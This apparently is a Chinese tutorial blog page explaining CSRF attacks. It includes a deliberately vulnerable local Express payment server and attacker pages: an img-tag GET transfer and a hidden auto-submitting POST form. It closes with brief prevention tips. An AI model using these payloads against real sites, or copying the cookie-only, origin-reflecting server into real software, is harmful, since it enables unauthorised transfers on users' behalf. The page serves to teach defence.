---
title: CSRF
date: 2020-11-20 20:39:27
sidebar: auto
tags:
  - csrf
  - 写作中
  - 浏览器安全
categories:
  - 浏览器
---

黑客利用登录状态，伪造成真实用户进行攻击。

## GET 请求攻击

1. 受害者登录目标网站，保存了该网站的登录状态
2. 攻击者诱导受害者进入第三方网站，向被攻击网站发送跨站请求
3. 由于用户已登录, 该跨站请求被成功执行

```js
+-------------------+
| 用户登录网站 A      |     给 Kobe 转账 '/pay?name=Kobe'
+---------+---------+
          |
       黑客诱导
          |
+---------v----------+
| 用户打开黑客网站 B    |    黑客网站里 img 标签指向转账的请求
+--------------------+    修改转账对象为黑客本身.. '/pay?name=黑客'
                                  +
                                  |
                                  v
                          +-------+-------+
                          | 转账到黑客本身  |
                          +---------------+
```

```bash
├── hacker.html
├── index.html
└── server.js
```

index.html

```html
<button onclick="login('kobe')">login</button>
<button onclick="pay('Tom',100)">转账给 Tom</button>

<a href="http://127.0.0.1:5500/hacker.html">点击查看美女照片</a>

<script>
  function login(user) {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `/login?user=${user}`);
    xhr.withCredentials = true;
    xhr.send();
  }

  function pay(target, money) {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `/pay?target=${target}&money=${money}`);
    xhr.withCredentials = true;
    xhr.send();
  }
</script>
```

hacker.html

```html
<img src="http://localhost:3000/pay?target=hacker&money=999" />
```

server.js

```js
const express = require('express');
const app = express();
const router = express.Router();
const port = 3000;

router.get('/login', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', true);
  res.cookie('user', req.query.user, {
    secure: true,
    sameSite: 'none',
  });
  res.json({ status: 'ok' });
});

router.get('/pay', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', true);

  const user = req.headers.cookie?.match(/user=(.*)/)?.[1];
  if (!user) return res.json({ status: 'error', message: '未登录' });
  else {
    console.log(`成功给 ${req.query.target} 转账 ${req.query.money}`);
    res.json({
      status: 'ok',
      message: `成功给 ${req.query.target} 转账 ${req.query.money}`,
    });
  }
});

app.use(express.static('./'));
app.use('/', router);

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
```

## POST 请求攻击

::::tabs

::: tab hacker.html

```html
<form method="POST" action="http://localhost:3000/pay" target="csrf-frame" id="csrf-form" style="display:none">
  <input name="target" value="hacker" />
  <input name="money" value="1000" />
  <input type="submit" value=" submit " />
</form>
<script>
  window.onload = function () {
    document.getElementById('csrf-form').submit();
  };
</script>
```

:::

::: tab index.html

```html
<button onclick="login('kobe')">login</button>
<button onclick="pay('Tom',100)">转账给 Tom</button>

<a href="http://127.0.0.1:5500/hacker.html">点击查看美女照片</a>

<script>
  function login(user) {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `/login?user=${user}`);
    xhr.withCredentials = true;
    xhr.send();
  }

  function pay(target, money) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', `/pay`);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ target, money }));
  }
</script>
```

:::

::: tab server.js

```js
const express = require('express');
const app = express();
const router = express.Router();
const port = 3000;

router.get('/login', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', true);
  res.cookie('user', req.query.user, {
    secure: true,
    sameSite: 'none',
  });
  res.json({ status: 'ok' });
});

router.post('/pay', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Credentials', true);

  const user = req.headers.cookie?.match(/user=(.*)/)?.[1];
  if (!user) return res.json({ status: 'error', message: '未登录' });
  else {
    console.log(`成功给 ${req.body.target} 转账 ${req.body.money}`);
    res.json({
      status: 'ok',
      message: `成功给 ${req.body.target} 转账 ${req.body.money}`,
    });
  }
});

app
  .use(express.static('./'))
  .use(express.json())
  .use(express.urlencoded({ extended: false }))
  .use('/', router);

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
```

:::

::::

黑客又构建了一个隐藏的表单，当我们访问这个网站的时候呢，他就将这个表单给提交了这样的话呢，也可以造成一次 CSRF 攻击。

## 怎么去预防

预防

1. 尽量使用 POST
2. 加入验证码
3. 加入 referer >> `req.headers.referer` 校验
4. token
5. 自定义 header -->
